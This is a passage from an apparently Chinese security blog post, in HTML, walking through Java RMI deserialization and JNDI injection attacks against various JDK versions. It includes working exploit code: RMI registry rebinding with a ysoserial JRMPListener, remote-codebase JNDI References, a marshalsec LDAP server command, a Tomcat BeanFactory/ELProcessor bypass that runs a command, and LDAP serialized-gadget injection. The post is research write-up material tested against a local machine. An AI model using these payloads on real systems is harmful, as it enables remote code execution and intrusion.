((TCPConnection)var7).getChannel().free(var7, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var5.discardPendingRefs();</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var17);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">	<span class="built_in">this</span>.ref.done(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里发起了连接，然后反序列化了返回的数据。我们可以通过 rebind 来攻击：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line"><span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1098</span>);</span><br><span class="line"><span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"><span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(App.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Registry.class</span><br><span class="line">&#125;, obj);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">registry.rebind(<span class="string">&quot;RMIServer&quot;</span>, proxy);</span><br></pre></td></tr></table></figure>
+
+<p>再在 1098 端口上跑一个 ysoserial 的 JRMPListener，然后就触发了另一个白名单 WAF：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> var1 != UID.class &amp;&amp; var1 != VMID.class &amp;&amp; var1 != Lease.class &amp;&amp; (var1.getPackage() == <span class="literal">null</span> || !Throwable.class.isAssignableFrom(var1) || !<span class="string">&quot;java.lang&quot;</span>.equals(var1.getPackage().getName()) &amp;&amp; !<span class="string">&quot;java.rmi&quot;</span>.equals(var1.getPackage().getName())) &amp;&amp; var1 != StackTraceElement.class &amp;&amp; var1 != ArrayList.class &amp;&amp; var1 != Object.class &amp;&amp; !var1.getName().equals(<span class="string">&quot;java.util.Collections$UnmodifiableList&quot;</span>) &amp;&amp; !var1.getName().equals(<span class="string">&quot;java.util.Collections$UnmodifiableCollection&quot;</span>) &amp;&amp; !var1.getName().equals(<span class="string">&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;</span>) &amp;&amp; !var1.getName().equals(<span class="string">&quot;java.util.Collections$EmptyList&quot;</span>) ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
+
+<p>查阅<a href="https://www.anquanke.com/post/id/197829">资料</a>，发现 jdk8u232_b09 版本以后增加了对于返回的序列化对象的过滤条件，所以我本机上的两个高版本 JDK 已经打不通了，为了测试我就装多了一个 8u221 的版本，还是可以打通的。</p>
+<p>在最新版本的 JDK 上，可能需要寻找其他利用方式或者其他反序列化利用链了。</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>简单来说就是一个客户端的 API，以一个 Hashtable 作为参数，可以通过修改 Hashtable 来访问不同的服务端，服务端支持 RMI、LDAP 等等，借用一张参考文章的图：</p>
+<p><img src="/css/images/RMI_LDAP/2020050908.png" srcset="/img/loading.gif"></p>
+<p>简单的测试例子，JNDI 使用 RMI：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:2333&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="type">RMIServerImpl</span> <span class="variable">rmiServer</span> <span class="operator">=</span> (RMIServerImpl)ctx.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/RMIServer&quot;</span>);</span><br><span class="line">System.out.print(rmiServer.call());</span><br></pre></td></tr></table></figure>
+
+<h3 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h3><p>之前 Fastjson 反序列化也有这种利用方式，通过控制 lookup 的参数，让 JNDI 加载远程数据从而完成攻击。</p>
+<h4 id="JDK-8u121"><a href="#JDK-8u121" class="headerlink" title="JDK &lt; 8u121"></a>JDK &lt; 8u121</h4><p>服务端向注册中心注册一个 Naming Reference，将 Codebase 远程地址指定为一个 web 服务器，JNDI 就会去该 web 服务器处加载恶意 class，实例化并执行其构造函数。攻击代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">registry.rebind(<span class="string">&quot;RMIServer&quot;</span>, referenceWrapper);</span><br><span class="line">System.out.println(<span class="string">&quot;Bind&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>JDNI 执行的关键函数在 NamingManager 类的 getObjectFactoryFromReference 函数中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(Reference ref, String factoryName)</span> <span class="keyword">throws</span> IllegalAccessException, InstantiationException, MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从 Reference 里面获取 codebase，即远程加载类的路径，然后加载远程 class，最后实例化造成 RCE。</p>
+<h4 id="JDK-8u191"><a href="#JDK-8u191" class="headerlink" title="JDK &lt; 8u191"></a>JDK &lt; 8u191</h4><p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，禁止从远程 codebase 加载 Factory，所以 RMI + JNDI Reference 的利用方式就无法使用了。</p>
+<p>RMI 不能用了，LDAP 还是可以用的，执行流程跟 RMI 相似，也可以使用 Reference，修改客户端 lookup 的参数，然后用 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> 启动一个 LDAP 的Reference 服务器：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\marshalsec<span class="literal">-0</span>.<span class="number">0.3</span><span class="literal">-SNAPSHOT-all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">2333</span>/<span class="comment">#Exploit 1389</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="高版本-JDK"><a href="#高版本-JDK" class="headerlink" title="高版本 JDK"></a>高版本 JDK</h4><p>com.sun.jndi.ldap.object.trustURLCodebase 的值也变成了 false，LDAP + JNDI Reference 的利用方式也无法使用了。</p>
+<p>现在绕过的方式主要有两种，利用本地类作为 Factory、利用 LDAP 返回序列化数据进行反序列化攻击。</p>
+<h5 id="本地类作为-Factory"><a href="#本地类作为-Factory" class="headerlink" title="本地类作为 Factory"></a>本地类作为 Factory</h5><p>不能从远程加载 Factory，但是可以指定一个本地类作为 Factory，它需要满足几个条件：</p>
+<ul>
+<li>继承 ObjectFactory</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DirectoryManager.java getObjectInstance</span></span><br><span class="line">ObjectFactory factory;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>有无参构造函数或无构造函数</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NamingManager.java getObjectFactoryFromReference</span></span><br><span class="line"><span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>存在 getObjectInstance 方法</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DirectoryManager.java getObjectInstance</span></span><br><span class="line"><span class="keyword">if</span> (factory <span class="keyword">instanceof</span> DirObjectFactory) &#123;</span><br><span class="line">	<span class="keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(ref, name, nameCtx, environment, attrs);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx, environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 Tomcat 依赖包中就存在一个类 org.apache.naming.factory.BeanFactory 满足这个条件，用 maven 下载依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其 getObjectInstance 方法很长，我放关键代码在这里：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">       	<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line">            <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    beanClass = Class.forName(beanClassName);</span><br><span class="line">                &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Look for properties with explicitly configured setter */</span></span><br><span class="line">            <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">            Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            String value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                value = (String)ra.getContent();</span><br><span class="line">                Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">                paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">                String setterName;</span><br><span class="line">                <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Items are given as comma separated list */</span></span><br><span class="line">                <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">                    param = param.trim();</span><br><span class="line">                    <span class="comment">/* A single item can either be of the form name=method</span></span><br><span class="line"><span class="comment">                         * or just a property name (and we will use a standard</span></span><br><span class="line"><span class="comment">                         * setter) */</span></span><br><span class="line">                    index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                        param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                    &#125;</span><br><span class="line">                    ...</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">                    &#125;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                ra = e.nextElement();</span><br><span class="line">                <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line">			   ...</span><br><span class="line">                value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">                Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">                <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                    valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        method.invoke(bean, valueArray);</span><br><span class="line">                    &#125; </span><br><span class="line">                    ...</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过设置 forceString，我们可以调用一个类的 public 方法，但是要求它的参数是一个 String。这里用 javax.el.ELProcessor 类来做测试，以一个 EL 表达式为参数调用它的 exec 方法就可以实现 RCE：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;Twings=eval&quot;</span>));</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;Twings&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;</span>));</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">registry.rebind(<span class="string">&quot;RMIServer&quot;</span>, referenceWrapper);</span><br><span class="line">System.out.println(<span class="string">&quot;Bind&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="LDAP-返回序列化数据"><a href="#LDAP-返回序列化数据" class="headerlink" title="LDAP 返回序列化数据"></a>LDAP 返回序列化数据</h5><p>LDAP 客户端在接收到服务端的数据之后，会有一个 decodeObject 的操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[<span class="number">2</span>]) != <span class="literal">null</span>) &#123;</span><br><span class="line">	var3 = Obj.decodeObject((Attributes)var4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后如果数据中 javaSerializedData 不为空，会有一个反序列化操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="number">1</span>])) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">var3</span> <span class="operator">=</span> helper.getURLClassLoader(var2);</span><br><span class="line">    <span class="keyword">return</span> deserializeObject((<span class="type">byte</span>[])((<span class="type">byte</span>[])var1.get()), var3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以以此来利用客户端存在的 gadget 来反序列化攻击，修改 LDAPRefServer，加上 javaSerializedData：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0A...&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">// e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span></span><br><span class="line"><span class="comment">// e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.anquanke.com/post/id/194384">https://www.anquanke.com/post/id/194384</a></p>
+<p><a href="https://www.freebuf.com/column/189835.html">https://www.freebuf.com/column/189835.html</a></p>
+<p><a href="https://xz.aliyun.com/t/7079">https://xz.aliyun.com/t/7079</a></p>
+<p><a href="https://xz.aliyun.com/t/7264">https://xz.aliyun.com/t/7264</a></p>
+<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2479">https://xz.aliyun.com/t/2479</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                      <a class="hover-with-bg" href="/tags/JRMP/">JRMP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/JNDI/">JNDI</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/05/12/%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>利用反序列化进行JNDI注入</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/04/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-readObject/">
+                        <span>Java反序列化漏洞-readObject-apache-commons-collections</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
